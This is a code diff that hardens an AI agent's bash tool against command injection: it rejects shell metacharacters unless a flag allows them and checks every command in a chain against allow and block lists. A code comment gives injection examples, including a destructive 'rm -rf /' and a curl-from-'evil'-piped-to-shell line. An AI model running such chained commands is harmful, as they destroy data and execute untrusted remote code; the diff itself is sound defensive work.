@@ -14,10 +14,19 @@ const bashInputSchema = z.object({
 interface BashToolOptions {
   allowedCommands?: string[];
   blockedCommands?: string[];
+  /** Allow shell metacharacters (dangerous — only enable for trusted contexts like CLI). */
+  allowShellOperators?: boolean;
 }
 
-const getFirstToken = (command: string): string => {
-  return command.trim().split(/\s+/)[0] ?? "";
+/** Shell metacharacters that enable command chaining / injection. */
+const SHELL_OPERATORS = /[;|&`$(){}><\n\\]/;
+
+/** Extract all command tokens from a pipeline/chain (split on shell operators). */
+const extractCommandTokens = (command: string): string[] => {
+  return command
+    .split(/[;|&`$(){}><\n]+/)
+    .map((segment) => segment.trim().split(/\s+/)[0] ?? "")
+    .filter((token) => token.length > 0);
 };
 
 export const createBashTool = (opts: BashToolOptions = {}): Tool => ({
@@ -26,24 +35,40 @@ export const createBashTool = (opts: BashToolOptions = {}): Tool => ({
   parameters: bashInputSchema,
   async execute(args) {
     const input = bashInputSchema.parse(args);
-    const firstToken = getFirstToken(input.command);
+    const command = input.command;
 
-    if (opts.allowedCommands && !opts.allowedCommands.includes(firstToken)) {
+    // Block shell operators unless explicitly allowed.
+    // This prevents injection via: ls; rm -rf /, ls && curl evil|sh, ls $(whoami), etc.
+    if (!opts.allowShellOperators && SHELL_OPERATORS.test(command)) {
       return {
-        content: `command '${firstToken}' is not allowed`,
+        content:
+          "command rejected: shell operators (;|&`$(){}><) are not allowed. " +
+          "Use separate tool calls for each command.",
         isError: true,
       };
     }
 
-    if (opts.blockedCommands?.includes(firstToken)) {
-      return {
-        content: `command '${firstToken}' is blocked`,
-        isError: true,
-      };
+    // Check every command token against allow/block lists, not just the first one.
+    const tokens = extractCommandTokens(command);
+
+    for (const token of tokens) {
+      if (opts.allowedCommands && !opts.allowedCommands.includes(token)) {
+        return {
+          content: `command '${token}' is not allowed`,
+          isError: true,
+        };
+      }
+
+      if (opts.blockedCommands?.includes(token)) {
+        return {
+          content: `command '${token}' is blocked`,
+          isError: true,
+        };
+      }
     }
 
     try {
-      const result = await execAsync(input.command, {
+      const result = await execAsync(command, {
         timeout: input.timeout ?? 30_000,
         maxBuffer: input.maxOutputBytes ?? 1_048_576,
       });
